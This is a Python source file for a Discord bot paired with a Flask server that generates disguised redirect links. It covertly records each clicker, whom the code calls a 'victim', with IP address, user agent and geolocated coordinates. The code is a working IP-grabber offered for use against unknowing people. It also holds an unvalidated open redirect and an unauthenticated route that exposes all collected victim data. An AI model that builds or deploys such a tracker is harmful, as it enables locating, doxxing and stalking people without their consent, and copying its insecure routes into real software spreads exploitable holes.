from flask import Flask, request, redirect, send_from_directory

from flask_cors import CORS


import json

import os

import requests

import discord

from discord.ext import commands

import random

import threading

from datetime import datetime

#Enter your server URL(where the python runtime is Hosted on)
#Example: http://127.0.0.1 (For Local Host)
#If you Hosting this Script on local host make sure to Open the Port you entered on your Router.
server_url = "http://127.0.0.1"
Bot_Token = "YOUR_BOT_TOKEN"
#Change the server Port to the server Port Provided by your Hoster. If you dont have Port leave the default Port.
Server_Port = "3004"


app = Flask(__name__)

CORS(app, resources={r"/*": {"origins": "*"}})

@app.route('/track', methods=['GET'])


def track():

    track_id = request.args.get('track_id')

    redirect_url = request.args.get('redirect_url')

    ip = request.remote_addr

    user_agent = request.headers.get('User-Agent')

    location_data = get_location_by_ip(ip)

    file_path = os.path.join('data', f'{track_id}.json')

    if os.path.exists(file_path):

        with open(file_path, 'r') as file:

            data = json.load(file)

    else:

        data = {

            'track_id': track_id,

            'redirect_url': redirect_url,

            'victims': []

        }

    next_victim_id = len(data['victims']) + 1

    victim_info = {

        'victim_id': next_victim_id,

        'redirect_url': redirect_url,

        'ip': ip,

        'user_agent': user_agent,

        'location': location_data

    }

    data['victims'].append(victim_info)

    with open(file_path, 'w') as file:

        json.dump(data, file, indent=4)

    return redirect(redirect_url)

def get_location_by_ip(ip):

    try:

        response = requests.get(f'https://ipinfo.io/{ip}/json')

        data = response.json()

        location = {

            'city': data.get('city'),

            'region': data.get('region'),

            'country': data.get('country'),

            'loc': data.get('loc')

        }

        return location

    except Exception as e:

        print(f"Fehler bei der Geolokalisierung: {e}")

        return {'error': 'Geolokalisierung fehlgeschlagen'}

@app.route('/data/<path:filename>')

def download_file(filename):

    return send_from_directory('data', filename)

def run_flask():

    app.run(host='0.0.0.0', port=Server_Port)

intents = discord.Intents.default()

intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

LINKS_FILE = 'links.json'

def load_links():

    if os.path.exists(LINKS_FILE):

        with open(LINKS_FILE, 'r') as f:

            return json.load(f)

    return {}

def save_links(links):

    with open(LINKS_FILE, 'w') as f:

        json.dump(links, f, indent=4)

class DashboardView(discord.ui.View):

    def __init__(self):

        super().__init__()

    @discord.ui.button(label="Generate Tracking Link", style=discord.ButtonStyle.secondary, custom_id="generate_tracking_link")

    async def generate_tracking_link(self, interaction: discord.Interaction, button: discord.ui.Button):

        modal = TrackingLinkModal()

        await interaction.response.send_modal(modal)

    @discord.ui.button(label="Fetch Track Data", style=discord.ButtonStyle.secondary, custom_id="fetch_track_data")

    async def fetch_track_data(self, interaction: discord.Interaction, button: discord.ui.Button):

        modal = TrackIDModal()

        await interaction.response.send_modal(modal)

    @discord.ui.button(label="Show My Links", style=discord.ButtonStyle.secondary, custom_id="show_my_links")

    async def show_my_links(self, interaction: discord.Interaction, button: discord.ui.Button):

        user_id = str(interaction.user.id)

        links = load_links()

        user_links = {k: v for k, v in links.items() if v.get('user_id') == user_id}

        if user_links:

            embed = discord.Embed(title="Your Links", color=0x00ff00)

            for track_id, link_data in user_links.items():

                file_path = os.path.join('data', f'{track_id}.json')

                if os.path.exists(file_path):

                    with open(file_path, 'r') as file:

                        track_data = json.load(file)

                    victim_count = len(track_data.get('victims', []))

                else:

                    victim_count = 0

                created_at = link_data.get('created_at', 'N/A')

                embed.add_field(

                    name=f"Track ID: {track_id}",

                    value=f"**Destination URL:** {link_data.get('destination_url')}\n"

                          f"**Number of Victims:** {victim_count}\n"

                          f"**Created At:** {created_at}",

                    inline=False

                )

        else:

            embed = discord.Embed(title="Your Links", description="You have no links.", color=0xff0000)

        await interaction.response.send_message(embed=embed, ephemeral=True)


class TrackingLinkModal(discord.ui.Modal):

    def __init__(self):

        super().__init__(title="Generate Tracking Link")

    destination_url = discord.ui.TextInput(label="Destination URL", placeholder="Enter the destination URL", required=True)

    async def on_submit(self, interaction: discord.Interaction):

        destination_url = self.destination_url.value

        links = load_links()

        track_id = random.randint(10000, 99999)

        while str(track_id) in links:

            track_id = random.randint(10000, 99999)

        tracking_url = f"{server_url}:{Server_Port}/track?track_id={track_id}&redirect_url={destination_url}"

        links[str(track_id)] = {

            'destination_url': destination_url,

            'user_id': str(interaction.user.id),

            'created_at': datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

        }

        save_links(links)

        await interaction.response.send_message(f"Tracking Link generiert: {tracking_url}", ephemeral=True)

class TrackIDModal(discord.ui.Modal):

    def __init__(self):

        super().__init__(title="Fetch Track Data")

    track_id = discord.ui.TextInput(label="Track ID", placeholder="Enter the Track ID", required=True)

    async def on_submit(self, interaction: discord.Interaction):

        track_id = self.track_id.value

        file_path = os.path.join('data', f'{track_id}.json')

        if os.path.exists(file_path):

            with open(file_path, 'r') as file:

                data = json.load(file)

            embed = discord.Embed(title=f"Track Data for ID: {track_id}", color=0x00ff00)

            embed.add_field(name="Redirect URL", value=data.get("redirect_url", "N/A"), inline=False)

            victims_info = ""

            for victim in data.get("victims", []):

                victim_info = (

                    f"**Victim ID:** {victim.get('victim_id', 'N/A')}\n"

                    f"**Redirect URL:** {victim.get('redirect_url', 'N/A')}\n"

                    f"**IP Address:** {victim.get('ip', 'N/A')}\n"

                    f"**User Agent:** {victim.get('user_agent', 'N/A')}\n"

                    f"**Location:**\n"

                    f"  - **City:** {victim.get('location', {}).get('city', 'N/A')}\n"

                    f"  - **Region:** {victim.get('location', {}).get('region', 'N/A')}\n"

                    f"  - **Country:** {victim.get('location', {}).get('country', 'N/A')}\n"

                    f"  - **Coordinates:** {victim.get('location', {}).get('loc', 'N/A')}\n"

                )

                victims_info += victim_info + "\n"

            if victims_info:

                embed.add_field(name="Victim Details", value=victims_info, inline=False)

            else:

                embed.add_field(name="Victim Details", value="No victims found.", inline=False)

            await interaction.response.send_message(embed=embed, ephemeral=True)

        else:

            await interaction.response.send_message(f"No data found for Track ID: {track_id}", ephemeral=True)

        
async def setup_bot():

    try:

        bot.load_extension('courses')

        print('Erweiterungen wurden geladen.')

    except Exception as e:

        print(f"Fehler beim Laden der Erweiterungen: {e}")
        
        
setup_bot()



@bot.event

async def on_ready():


    print(f'Logged in as {bot.user}!')

@bot.command()

async def dashboard(ctx):

    embed = discord.Embed(title="Dashboard", description="Hier ist dein Dashboard!", color=0x00ff00)

    view = DashboardView()

    await ctx.send(embed=embed, view=view)



def run_bot():

    try:

   
     bot.run(Bot_Token)

    except Exception as e:

        print(f"Fehler beim Starten des Bots: {e}")

flask_thread = threading.Thread(target=run_flask)

flask_thread.start()

run_bot()

